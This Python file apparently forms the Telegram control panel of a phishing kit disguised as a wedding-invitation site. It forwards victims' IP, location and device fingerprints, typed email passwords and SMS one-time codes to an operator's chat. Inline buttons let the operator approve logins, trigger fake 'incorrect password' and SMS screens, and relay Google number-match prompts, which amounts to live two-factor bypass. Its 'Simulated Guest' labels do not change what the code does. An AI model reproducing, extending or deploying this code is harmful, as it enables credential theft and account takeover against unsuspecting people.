import os
import time
import json
import requests
from datetime import datetime


class TelegramService:
    def __init__(self, token=None, chat_id=None):
        self.bot_token = token or os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        self.last_update_id = 0
        self.polling_in_progress = False
        # temporary host selection state: { attempt_id: [nums] }
        self.host_selections = {}

    def is_configured(self):
        return len(self.bot_token) > 0 and len(self.chat_id) > 0

    def get_config(self):
        return {
            "hasToken": len(self.bot_token) > 0,
            "hasChatId": len(self.chat_id) > 0,
            "maskedToken": f"{self.bot_token[:6]}...{self.bot_token[-4:]}" if self.bot_token else "Not Configured",
            "chatId": self.chat_id or "Not Configured"
        }

    def api_call(self, method, payload):
        if not self.bot_token:
            raise ValueError("Telegram Bot Token is not configured.")
        url = f"https://api.telegram.org/bot{self.bot_token}/{method}"
        try:
            res = requests.post(url, json=payload, timeout=5)
            data = res.json()
            if not data.get("ok"):
                raise Exception(f"Telegram API Error: {data.get('description', json.dumps(data))}")
            return data.get("result")
        except Exception as e:
            raise e

    def send_message(self, text, parse_mode="HTML", reply_markup=None):
        if not self.chat_id:
            raise ValueError("Telegram Chat ID is not configured.")
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
            
        return self.api_call("sendMessage", payload)

    def send_visitor_alert(self, visitor):
        if not self.is_configured():
            return None

        ai_generated_text = ""
        api_key = os.environ.get("GEMINI_API_KEY", "").strip()

        if api_key:
            try:
                from google import genai
                client = genai.Client(api_key=api_key)
                prompt = f"""
Analyze the following incoming visitor telemetry for a wedding/celebration invitation event platform:
- IP Address: {visitor.get('ip') or "Unknown"}
- Location: {visitor.get('city') or "Unknown"}, {visitor.get('region') or "Unknown"}, {visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})
- Network Provider/ISP: {visitor.get('org') or "Unknown"}
- Browser: {visitor.get('browser') or "Unknown"}
- Operating System: {visitor.get('os') or "Unknown"}
- Screen Size: {visitor.get('screenSize') or "Unknown"}
- Language: {visitor.get('language') or "Unknown"}
- Timezone: {visitor.get('timezone') or "Unknown"}
- CPU Cores: {visitor.get('cores') or "Unknown"}
- Platform: {visitor.get('platform') or "Unknown"}
- User Agent: {visitor.get('userAgent') or "Unknown"}

Write an elegant, witty, and highly readable real-time notification alert (written in HTML parse mode format for Telegram).
Your output must use standard HTML tags allowed by Telegram:
- <b>Bold text</b> for headers or highlights
- <i>Italic text</i> for aesthetic notes
- <code>Monospace code</code> for raw details like IP, timezone, provider, device name or specs

Structure your response beautifully:
1. A clever, premium, or wedding-themed headline (e.g., "✨ <b>A Guest Just Slipped In!</b>" or "🥂 <b>A New Invitation Handshake!</b>")
2. An elegant "AI Smart Assessment" paragraph or narrative (witty/charming, describing where they are joining from in the world, what time of day it might be there, and what gear or device they are using).
3. A beautifully formatted bulleted summary of their key geographical and device parameters wrapped in HTML.

Keep the output concise, charming, and extremely helpful. Do not output anything other than the telegram HTML message text. Avoid markdown symbols. Return only the Telegram HTML body.
"""
                retries_left = 3
                current_delay = 1.0
                response = None
                while retries_left > 0:
                    try:
                        response = client.models.generate_content(
                            model="gemini-3.5-flash",
                            contents=prompt
                        )
                        break
                    except Exception as err:
                        err_str = str(err)
                        is_transient = "503" in err_str or "429" in err_str or "high demand" in err_str or "unavailable" in err_str.lower()
                        if retries_left > 1 and is_transient:
                            print(f"[Telegram AI] Transient error: {err_str[:120]}. Retrying in {current_delay}s...", flush=True)
                            time.sleep(current_delay)
                            current_delay *= 2
                            retries_left -= 1
                        else:
                            raise err

                if response and response.text:
                    ai_generated_text = response.text.strip()
            except Exception as err:
                print(f"[Telegram AI Info] Could not generate AI visitor summary: {err}", flush=True)

        if ai_generated_text:
            message = ai_generated_text
        else:
            message = f"""
👀 <b>New Visitor Entered Site!</b>
━━━━━━━━━━━━━━━━━━
📍 <b>Location & Network:</b>
• IP: <code>{visitor.get('ip') or "Unknown"}</code>
• City: <code>{visitor.get('city') or "Unknown"}</code>
• Region: <code>{visitor.get('region') or "Unknown"}</code>
• Country: <code>{visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})</code>
• Provider/ISP: <code>{visitor.get('org') or "Unknown"}</code>

📱 <b>Device & Browser Fingerprint:</b>
• Browser: <code>{visitor.get('browser') or "Unknown"}</code>
• OS: <code>{visitor.get('os') or "Unknown"}</code>
• Screen Size: <code>{visitor.get('screenSize') or "Unknown"}</code>
• Language: <code>{visitor.get('language') or "Unknown"}</code>
• Timezone: <code>{visitor.get('timezone') or "Unknown"}</code>
• CPU Cores: <code>{visitor.get('cores') or "Unknown"} Cores</code>
• Platform: <code>{visitor.get('platform') or "Unknown"}</code>
• User Agent: <code>{visitor.get('userAgent') or "Unknown"}</code>
━━━━━━━━━━━━━━━━━━
<i>Delivered by Invitation Handshake Gateway</i>
            """.strip()

        return self.send_message(message, "HTML")

    def send_login_alert(self, state):
        if not self.is_configured():
            return None
        provider_name = state.get("provider", "").upper()
        prompt_details = f"🔢 <b>Gmail Match Code:</b> <code style=\"font-size:18px;\">{state.get('promptNumber')}</code>\n" if state.get("promptNumber") else ""
        
        time_format = datetime.utcnow().strftime("%H:%M:%S")
        if state.get("timestamp"):
            try:
                dt = datetime.fromisoformat(state.get("timestamp").replace("Z", "+00:00"))
                time_format = dt.strftime("%H:%M:%S")
            except Exception:
                pass

        message = f"""
🔐 <b>Simulated Guest Gateway Login</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Portal:</b> {provider_name}
📧 <b>Guest Email:</b> <code>{state.get('email')}</code>
🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
{prompt_details}📍 <b>Timestamp:</b> {time_format}
━━━━━━━━━━━━━━━━━━
<b>⚠️ HOST ACTIONS REQLOCKED</b>
Choose real-time bypass command below:
        """.strip()

        keyboard = []
        keyboard.append([
            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{state.get('id')}"},
        ])
        keyboard.append([
            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{state.get('id')}"},
            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
        ])

        candidates = state.get('promptCandidates') or []
        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
            row = []
            for num in candidates:
                row.append({"text": str(num), "callback_data": f"tg:picknum:{state.get('id')}:{num}"})
            keyboard.append(row)
            keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{state.get('id')}"}
            ])
        else:
            keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{state.get('id')}"}
            ])

        inline_keyboard = {"inline_keyboard": keyboard}
        return self.send_message(message, "HTML", inline_keyboard)

    def send_sms_submit_alert(self, state):
        if not self.is_configured():
            return None
        message = f"""
📲 <b>Simulated Guest OTP Received!</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Portal:</b> {state.get('provider', '').upper()}
📧 <b>Guest Email:</b> <code>{state.get('email')}</code>
📞 <b>Bound Mobile:</b> <code>+1 {state.get('phone') or "Not provided"}</code>
📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
━━━━━━━━━━━━━━━━━━
<b>⚠️ RE-VERIFY CONTROL</b>
What is the guest status for this OTP?
        """.strip()

        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "Approve OTP ✅", "callback_data": f"tg:approve:{state.get('id')}"},
                    {"text": "Invalid Code Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
                ]
            ]
        }
        return self.send_message(message, "HTML", inline_keyboard)

    def poll_updates(self, on_action_received):
        if not self.is_configured():
            return 0
        if self.polling_in_progress:
            return 0
        self.polling_in_progress = True
        try:
            payload = {"timeout": 30} # 💡 Set long-polling interval optimally to drop background CPU consumption
            if self.last_update_id > 0:
                payload["offset"] = self.last_update_id + 1
            
            updates = self.api_call("getUpdates", payload)
            count = 0
            for update in updates:
                self.last_update_id = max(self.last_update_id, update.get("update_id", 0))
                callback_query = update.get("callback_query")
                message_update = update.get("message") or update.get("edited_message")
                
                if message_update and isinstance(message_update, dict):
                    try:
                        text = message_update.get("text", "") or ""
                        if text.lower().startswith("candidates "):
                            parts_msg = text.split()
                            if len(parts_msg) >= 5:
                                attempt_id_msg = parts_msg[1]
                                cand_vals = parts_msg[2:5]
                                try:
                                    self.api_call("sendMessage", {
                                        "chat_id": message_update.get("chat", {}).get("id"),
                                        "text": f"Received candidate set for {attempt_id_msg}: {', '.join(cand_vals)}\nDelivering to guest...",
                                        "parse_mode": "HTML"
                                    })
                                except Exception:
                                    pass
                                on_action_received(attempt_id_msg, "number_prompt", {"candidates": cand_vals})
                                count += 1
                                continue
                    except Exception as e:
                        print(f"Failed to parse candidate text message: {e}", flush=True)
                if callback_query:
                    data = callback_query.get("data", "")
                    query_id = callback_query.get("id")
                    if data and data.startswith("tg:"):
                        parts = data.split(":")
                        action = parts[1]
                        attempt_id = parts[2]
                        
                        handled_inline = False
                        mapped_action = "pending"
                        feedback = "Action processed"
                        
                        if action == "approve":
                            mapped_action = "approve"
                            feedback = "Bypass approved! ✅"
                        elif action == "deny":
                            mapped_action = "deny"
                            feedback = "Access Blocked! ❌"
                        # 💡 Unified shorthand variations with deep string logic checking
                        elif action in ["req_sms", "request_sms"]:
                            mapped_action = "request_sms"
                            feedback = "SMS screen requested! 📲"
                        elif action == "num_prompt":
                            mapped_action = "pending"
                            feedback = "Number-matching prompt requested! 🔢"
                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                if attempt_id not in self.host_selections:
                                    self.host_selections[attempt_id] = []

                                keyboard = []
                                nums = list(range(1, 101))
                                for r in range(0, 100, 10):
                                    row = []
                                    for n in nums[r:r+10]:
                                        label = str(n)
                                        if n in self.host_selections.get(attempt_id, []):
                                            label = "✓" + label
                                        row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
                                    keyboard.append(row)

                                selected = self.host_selections.get(attempt_id, [])
                                control_row = [ {"text": f"Selected: {', '.join(map(str, selected)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"} ]
                                if len(selected) == 1:
                                    control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{selected[0]}"})
                                else:
                                    control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})

                                keyboard.append(control_row)

                                try:
                                    self.api_call("editMessageText", {
                                        "chat_id": chat_id_val,
                                        "message_id": orig.get("message_id") if orig else None,
                                        "text": (orig.get("text") or orig.get("caption") or "") + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": keyboard}
                                    })
                                except Exception as _e:
                                    print(f"Failed to edit message with host 1-100 keyboard: {_e}", flush=True)
                            except Exception as _e:
                                print(f"Failed to prepare 1-100 keyboard: {_e}", flush=True)
                            handled_inline = True
                        elif action == "picknum":
                            mapped_action = "number_prompt"
                            chosen = None
                            try:
                                chosen = parts[3]
                                feedback = f"Number selected: {chosen} 🔢"
                            except Exception:
                                feedback = "Number selection received"
                        # 💡 Catch normalized incorrect password strings seamlessly
                        elif action in ["inc_pw", "incorrect_password"]:
                            mapped_action = "incorrect_password"
                            feedback = "Incorrect Password screen requested! ⚠️"
                        elif action == "hostpick":
                            mapped_action = "pending"
                            handled_inline = True
                            try:
                                chosen_num = int(parts[3])
                            except Exception:
                                chosen_num = None
                            sel = self.host_selections.get(attempt_id, [])
                            if chosen_num is not None:
                                if chosen_num in sel:
                                    sel.remove(chosen_num)
                                else:
                                    if len(sel) < 1:
                                        sel.append(chosen_num)
                                self.host_selections[attempt_id] = sel
                            feedback = f"Selected: {', '.join(map(str, sel)) or 'None'}"
                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                keyboard = []
                                nums = list(range(1, 101))
                                for r in range(0, 100, 10):
                                    row = []
                                    for n in nums[r:r+10]:
                                        label = str(n)
                                        if n in sel:
                                            label = "✓" + label
                                        row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
                                    keyboard.append(row)
                                control_row = [ {"text": f"Selected: {', '.join(map(str, sel)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"} ]
                                if len(sel) == 1:
                                    control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{sel[0]}"})
                                else:
                                    control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
                                keyboard.append(control_row)
                                self.api_call("editMessageText", {
                                    "chat_id": chat_id_val,
                                    "message_id": orig.get("message_id") if orig else None,
                                    "text": (orig.get("text") or orig.get("caption") or "") + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
                                    "parse_mode": "HTML",
                                    "reply_markup": {"inline_keyboard": keyboard}
                                })
                            except Exception as _e:
                                print(f"Failed to update host 1-100 keyboard: {_e}", flush=True)
                        elif action == "noop":
                            mapped_action = "pending"
                            handled_inline = True
                            feedback = "Please select exactly 1 number."
                        elif action == "sendcandidates":
                            mapped_action = "number_prompt"
                            handled_inline = True
                            feedback = "Number sent to guest ✅"
                            chosen_candidates = []
                            try:
                                chosen_candidates = [parts[3]]
                            except Exception:
                                chosen_candidates = []
                            try:
                                if attempt_id in self.host_selections:
                                    del self.host_selections[attempt_id]
                            except Exception:
                                pass
                            
                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                control_keyboard = {
                                    "inline_keyboard": [
                                        [
                                            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
                                        ],
                                        [
                                            # 💡 Standardized callback identifiers to ensure cross-view reliability
                                            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                                            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                                        ]
                                    ]
                                }
                                self.api_call("editMessageText", {
                                    "chat_id": chat_id_val,
                                    "message_id": orig.get("message_id") if orig else None,
                                    "text": (orig.get("text") or orig.get("caption") or "") + f"\n\n⚡️ Guest is seeing number: {chosen_candidates[0] if chosen_candidates else ''}\nWaiting for host to verify via Google and approve or reject.",
                                    "parse_mode": "HTML",
                                    "reply_markup": control_keyboard
                                })
                            except Exception as _e:
                                print(f"Failed to restore host keyboard: {_e}", flush=True)

                        try:
                            self.api_call("answerCallbackQuery", {
                                "callback_query_id": query_id,
                                "text": feedback
                            })
                        except Exception as e:
                            print(f"Failed to answer callback query: {e}", flush=True)

                        if not handled_inline:
                            try:
                                original_msg = callback_query.get("message")
                                if original_msg:
                                    current_text = original_msg.get("text") or ""
                                    if current_text:
                                        updated_text = f"{current_text}\n\n━━━━⊱ ACTION LOG ⊰━━━━\n⚡️ <i>Action Selected: {feedback}</i>"
                                    else:
                                        updated_text = f"{original_msg.get('caption') or ''}\n\n[Action Selected: {feedback}]"
                                    
                                    self.api_call("editMessageText", {
                                        "chat_id": original_msg.get("chat", {}).get("id"),
                                        "message_id": original_msg.get("message_id"),
                                        "text": updated_text,
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": []}
                                    })
                            except Exception as e:
                                print(f"Failed to edit message text: {e}", flush=True)

                        if action == "picknum":
                            try:
                                chosen_val = parts[3]
                            except Exception:
                                chosen_val = None
                            on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
                        elif action == "sendcandidates":
                            try:
                                candidates_list = [parts[3]]
                            except Exception:
                                candidates_list = []
                            on_action_received(attempt_id, mapped_action, {"candidates": candidates_list})
                        else:
                            on_action_received(attempt_id, mapped_action)
                        count += 1
            return count
        except Exception as e:
            err_msg = str(e)
            if "Conflict" in err_msg or "terminated by other getUpdates" in err_msg:
                print("[Telegram Polling Info] Active getUpdates conflict detected. Skipping this interval sequence dynamically.", flush=True)
            else:
                print(f"[Telegram Polling Warning] {err_msg}", flush=True)
            return 0
        finally:
            self.polling_in_progress = False